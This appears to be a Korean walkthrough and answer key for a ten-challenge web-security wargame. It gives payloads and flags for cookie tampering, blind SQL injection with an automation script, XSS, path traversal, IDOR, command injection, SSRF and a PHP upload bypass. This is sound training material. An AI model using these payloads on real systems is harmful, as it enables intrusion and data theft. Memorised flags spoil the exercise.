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 워게임 문제 워크스루</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>생성일: 2026-07-13</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>대상: EST 전술보안 인트라넷 워게임</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>제출 전제: 먼저 사이트에서 분대명을 등록해야 플래그 제출이 정상 처리됩니다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>전체 문제 요약</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. 세션 그림자</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `session-shadow`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: 쿠키 변조 / 초급</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 출입 판정에 사용되는 쿠키 값을 확인하고 상위 권한으로 변경한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 문제 페이지에 접속해 현재 출입 판정이 limited인지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. 개발자 도구의 Application/Storage 또는 브라우저 쿠키 목록에서 shadow_role 쿠키를 찾는다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. shadow_role 값을 guest에서 admin으로 변경한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. 페이지를 새로고침하면 granted 상태와 인증 표식이 표시된다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>document.cookie = "shadow_role=admin; path=/"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{cookie_role_admin_shadow}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: 서버가 쿠키 값을 서명이나 세션 검증 없이 그대로 신뢰하는 취약점이다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. 비문 공지 검색소</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `blind-notice`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: Boolean Blind SQL Injection / 중급</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 검색 결과 존재 여부만 이용해 비공개 메모의 FLAG를 한 글자씩 추출한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 검색어가 SQL LIKE 조건에 직접 이어 붙는 구조임을 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. %' OR 1=1 --  같은 입력으로 참 조건을 만들면 결과가 존재한다고 표시된다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. SUBSTR(body,위치,1) 조건을 이용해 FLAG의 각 글자를 참/거짓으로 판별한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. 반복 요청이 많으므로 간단한 스크립트로 자동화한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">%' OR SUBSTR(body,1,5)='FLAG{' -- </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>자동화 예시</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>import requests</w:t>
        <w:br/>
        <w:t>url = "http://100.83.178.9/challenges/blind-notice.php"</w:t>
        <w:br/>
        <w:t>chars = "FLAG{}_abcdefghijklmnopqrstuvwxyz0123456789"</w:t>
        <w:br/>
        <w:t>flag = ""</w:t>
        <w:br/>
        <w:t>for pos in range(1, 80):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for ch in chars:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        payload = f"%' OR SUBSTR(body,{pos},1)='{ch}' -- "</w:t>
        <w:br/>
        <w:t xml:space="preserve">        r = requests.get(url, params={"q": payload})</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if "조건에 맞는 공지가 존재합니다" in r.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            flag += ch</w:t>
        <w:br/>
        <w:t xml:space="preserve">            print(flag)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if flag.endswith("}"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{boolean_blind_notice_42c7}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: 값을 직접 출력하지 못해도 화면 반응 차이가 있으면 데이터 추출이 가능하다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. 반사 게시판 검색</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `reflected-board`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: DOM XSS / 중급 입문</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 검색 결과가 innerHTML로 렌더링되는 점을 이용해 alert()를 실행한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 검색창에 일반 문자열을 넣어 결과 영역에 그대로 반사되는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. &lt;b&gt;test&lt;/b&gt; 같은 태그를 넣어 HTML로 해석되는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. script 태그 대신 이미지 오류 이벤트처럼 자동 실행되는 이벤트 핸들러를 사용한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. alert()가 호출되면 페이지가 FLAG를 표시한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;img src=x onerror="alert(1)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{dom_xss_reflected_search_alert}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: pwned 같은 문자열은 정답 단서가 아니며 alert 함수 호출 여부만 중요하다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. 영상 보급창</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `image-vault`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: Path Traversal / 상급 입문</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 파일명 필터가 .png 포함 여부만 검사하는 점을 이용해 내부 flag 파일을 읽는다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. file 파라미터가 보급 파일명을 받아 서버 파일을 읽는 구조를 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. 필터는 파일명에 .png가 포함되는지만 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. 경로 이동 표현을 사용하되, 파일명 어딘가에 .png 문자열을 남긴다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. 최종 경로가 assets/vault/flag.txt를 가리키게 만든다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>allowed.png/../flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{image_vault_path_filter_bypass}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: 환경에 따라 경로 정규화가 다를 수 있으므로 .png를 유지한 우회 경로를 여러 방식으로 시도할 수 있다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. 코인 제국 보급 작전</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `idle-empire`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: Client Trust / 중급</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 클라이언트 저장소와 보고 요청 값을 조작해 목표 누적 코인을 달성한 것처럼 만든다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 브라우저 개발자 도구에서 localStorage의 idleEmpireSave 값을 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. totalEarned 값이 목표 달성 판단에 사용되는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. totalEarned를 100000000 이상으로 조작하거나 claim 요청의 totalEarned 값을 직접 크게 보낸다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. 승인 API가 클라이언트 값을 신뢰해 FLAG를 반환한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>localStorage.setItem('idleEmpireSave', JSON.stringify({coins:100000000,totalEarned:100000000,playTime:0,levels:{}}))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{idle_empire_client_trust_bypass}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: 중요한 검증을 클라이언트에 맡기면 사용자가 값을 바꿔 결과를 위조할 수 있다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. 작전 보고서 열람소</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `mission-report`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: IDOR / 중급</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 공개 목록에는 없는 보고서 번호를 URL에서 직접 바꿔 비문 보고서를 열람한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 공개 보고서 목록의 링크를 클릭하며 URL의 report 파라미터 변화를 관찰한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. 화면에는 1001~1003만 보이지만 서버가 요청 번호의 권한을 확인하지 않는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. URL에서 report 값을 1004, 1005처럼 순서대로 바꿔본다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. 더미 보고서를 지나 report=1008에서 관리관 전용 비문 보고서와 FLAG를 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://100.83.178.9/challenges/mission-report.php?report=1008</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{cDgkb2FfdDE5MV9ycjQ}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: 객체 ID를 추측할 수 있고 권한 검사가 없으면 다른 사용자의 객체에 접근할 수 있다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. 네트워크 진단</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `net-diagnostics`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: Command Injection / 중상급</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: host 입력값이 ping 명령 뒤에 그대로 붙는 점을 이용해 추가 명령을 실행한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 정상 IP를 입력해 ping 결과가 출력되는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. host 값이 shell_exec로 실행되는 명령 뒤에 붙는 구조임을 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. 셸 구분자 ; 또는 &amp;&amp; 뒤에 파일 출력 명령을 붙인다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. /tmp/est-net-diagnostics-flag.txt 내용을 출력한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>127.0.0.1; cat /tmp/est-net-diagnostics-flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{ops_ping_command_injection}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: 사용자 입력을 셸 명령 문자열로 조립하면 명령 구분자를 통해 다른 명령이 실행될 수 있다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. 관리관 메모 연쇄</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `admin-memo-chain`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: Stored XSS / 고급</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 저장된 메모가 HTML로 렌더링되는 점을 이용해 관리관 전용 API 호출을 유도한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 메모를 등록하면 페이지에 다시 표시되는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. 메모 본문이 htmlspecialchars 없이 출력되는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. HTML 태그를 저장해 브라우저 요청을 발생시킨다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. admin_api=flag가 포함된 요청이 검토 흐름에 감지되면 결과 기록에 FLAG가 남는다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;img src="/challenges/admin-memo-chain.php?admin_api=flag"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{stored_xss_admin_memo_chain}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: Reflected/DOM XSS와 달리 페이로드가 서버에 저장되고 이후 렌더링 시 실행되는 점이 핵심이다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. 내부 보급망 점검기</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `internal-supply`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: SSRF / 중상급</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 서버가 대신 URL을 요청하는 기능으로 localhost 전용 API에 접근한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 브라우저에서 직접 /challenges/internal-supply.php?internal=flag에 접근하면 403이 발생한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. 문제의 URL 입력칸은 서버가 file_get_contents로 대신 요청한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. 입력칸에 127.0.0.1 주소를 넣어 서버가 자기 자신으로 요청하게 만든다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. 서버 기준 localhost 요청이므로 내부 전용 FLAG가 출력된다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://127.0.0.1/challenges/internal-supply.php?internal=flag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{ssrf_internal_supply_route}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: 브라우저 주소창의 127.0.0.1은 내 PC이고, SSRF 입력칸의 127.0.0.1은 서버 자신이라는 차이가 중요하다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>10. 전송 파일 업로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>문제 ID: `upload-dispatch`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>분류/난이도: File Upload / 고급</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>목표: 파일명 확장자 검사를 우회해 실행 가능한 PHP 첨부를 업로드하고 숨겨진 파일을 읽는다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>풀이 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 업로드 로직이 파일명에 .png/.jpg/.jpeg 문자열 포함 여부만 확인하는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. 실제 마지막 확장자는 .php로 유지하고 중간에 .png를 넣은 파일명을 만든다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. 업로드된 공개 경로로 접속해 PHP가 실행되는지 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. 업로드 디렉터리의 .dispatch_flag 파일을 읽는다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>핵심 페이로드</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Malgun Gothic"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>파일명: shell.png.php</w:t>
        <w:br/>
        <w:t>내용: &lt;?php echo file_get_contents(__DIR__ . '/.dispatch_flag'); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>정답</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`FLAG{dispatch_upload_php_execution}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>메모: 파일명 문자열 검사와 웹 서버의 실제 실행 판단이 다르면 업로드 우회가 가능하다.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